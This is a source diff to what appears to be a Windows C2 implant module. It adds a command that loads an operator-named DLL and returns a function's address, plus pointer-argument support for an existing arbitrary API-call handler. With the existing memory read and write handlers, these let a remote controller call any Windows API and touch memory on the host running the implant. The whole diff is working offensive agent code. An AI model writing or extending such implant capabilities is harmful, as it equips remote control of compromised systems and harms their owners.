@@ -76,6 +76,11 @@
                        TAB_BASE, \
                        API_CALL + 2)
 
+#define FORGE_RESOLVE \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       TAB_BASE, \
+                       API_CALL + 3)
+
 /* TLV types — string family */
 #define TLV_TYPE_FORGE_DLL \
         TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
@@ -109,6 +114,7 @@
 #define ARG_BUF_IN     5
 #define ARG_BUF_OUT    6
 #define ARG_BUF_INOUT  7
+#define ARG_PTR        8
 
 #define MAX_FORGE_ARGS 16
 
@@ -310,6 +316,21 @@ static tlv_pkt_t *forge_call(c2_t *c2)
                     break;
                 }
 
+                case ARG_PTR:
+                {
+                    ULONG_PTR val = 0;
+                    if (data_len >= 8)
+                        memcpy(&val, args_buf + offset, 8);
+                    else if (data_len >= 4)
+                    {
+                        DWORD tmp = 0;
+                        memcpy(&tmp, args_buf + offset, 4);
+                        val = (ULONG_PTR)tmp;
+                    }
+                    values[argc] = val;
+                    break;
+                }
+
                 default:
                     values[argc] = 0;
                     break;
@@ -471,6 +492,47 @@ static tlv_pkt_t *forge_memwrite(c2_t *c2)
 }
 
 /* ------------------------------------------------------------------ */
+/* forge_resolve — resolve DLL!Func to address without calling          */
+/* ------------------------------------------------------------------ */
+
+static tlv_pkt_t *forge_resolve(c2_t *c2)
+{
+    char dll_name[256];
+    char func_name[256];
+    HMODULE hMod;
+    FARPROC pFunc;
+    tlv_pkt_t *result;
+    unsigned char addr_bytes[8];
+    ULONG_PTR addr;
+
+    if (tlv_pkt_get_string(c2->request, TLV_TYPE_FORGE_DLL, dll_name) < 0 ||
+        tlv_pkt_get_string(c2->request, TLV_TYPE_FORGE_FUNC, func_name) < 0)
+    {
+        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
+    }
+
+    hMod = w.pLoadLibraryA(dll_name);
+    if (hMod == NULL)
+    {
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+    }
+
+    pFunc = w.pGetProcAddress(hMod, func_name);
+    if (pFunc == NULL)
+    {
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+    }
+
+    addr = (ULONG_PTR)pFunc;
+    memcpy(addr_bytes, &addr, 8);
+
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
+    tlv_pkt_add_bytes(result, TLV_TYPE_FORGE_ADDR, addr_bytes, 8);
+
+    return result;
+}
+
+/* ------------------------------------------------------------------ */
 /* COT entry                                                           */
 /* ------------------------------------------------------------------ */
 
@@ -486,6 +548,7 @@ COT_ENTRY
     api_call_register(api_calls, FORGE_CALL,     (api_t)forge_call);
     api_call_register(api_calls, FORGE_MEMREAD,  (api_t)forge_memread);
     api_call_register(api_calls, FORGE_MEMWRITE, (api_t)forge_memwrite);
+    api_call_register(api_calls, FORGE_RESOLVE,  (api_t)forge_resolve);
 }
 
 #else /* POSIX */
